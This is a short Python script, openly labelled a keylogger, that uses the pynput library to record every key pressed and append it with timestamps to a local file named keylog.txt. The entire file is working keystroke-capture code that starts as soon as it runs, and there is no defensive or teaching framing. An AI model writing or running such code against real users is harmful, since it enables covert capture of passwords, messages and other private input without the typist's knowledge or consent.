from pynput.keyboard import Listener, Key
import time

def on_press(key):

    # Check for special keys
    if key == Key.enter:
        with open("keylog.txt", "a") as f:
            f.write("\n")
    elif key == Key.space:
        with open("keylog.txt", "a") as f:
            f.write(" ")
    else:
        with open("keylog.txt", "a") as f:
            f.write(str(key).strip("'"))

# Function to log timestamps
def log_timestamp():
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open("keylog.txt", "a") as f:
        f.write("\n[{}] ".format(timestamp))

# Function to start the keylogger
def start_keylogger():
    with open("keylog.txt", "a") as f:
        f.write("\n\n----- Keylogger Started -----\n\n")

    with Listener(on_press=on_press) as listener:
        try:
            log_timestamp()
            # Start the listener to begin capturing keyboard events
            listener.join()
        except KeyboardInterrupt:
            # Handle CTRL+C to terminate the program gracefully
            with open("keylog.txt", "a") as f:
                f.write("\n\n----- Keylogger Stopped -----\n")

# Call the function to start the keylogger
start_keylogger()
